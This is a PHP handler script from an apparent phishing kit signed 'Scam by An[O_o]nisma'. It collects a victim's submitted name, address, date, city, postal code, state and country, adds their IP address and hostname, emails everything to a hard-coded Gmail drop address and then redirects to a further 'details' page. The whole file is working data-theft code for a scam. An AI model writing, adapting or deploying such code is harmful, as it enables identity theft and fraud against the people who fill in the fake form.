<?php



$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "|----------|Scam by An[O_o]nisma|--------------|\n";
$message .= "|FRST - NM: ".$_POST['first-name']."\n";
$message .= "|LST - NM : ".$_POST['last-name']."\n";
$message .= "|ADRS: ".$_POST['address']."\n";
$message .= "|DT   : ".$_POST['date']."\n";
$message .= "|CTY  : ".$_POST['city']."\n";
$message .= "|PSTL - CD   : ".$_POST['postal-code']."\n";
$message .= "|STT     : ".$_POST['state']."\n";
$message .= "|CNTRY     : ".$_POST['country']."\n";
$message .= "|---------------|Info|-------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|HostName : ".$hostname."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "|----------|Scam by An[O_o]nisma|--------------|\n";
$send = "hamilanors@gmail.com";
$subject = "~ Nuevos Resultados ~ | $ip";
{
mail("$send", "$subject", $message);   
}
header("Location:../details.html");
?>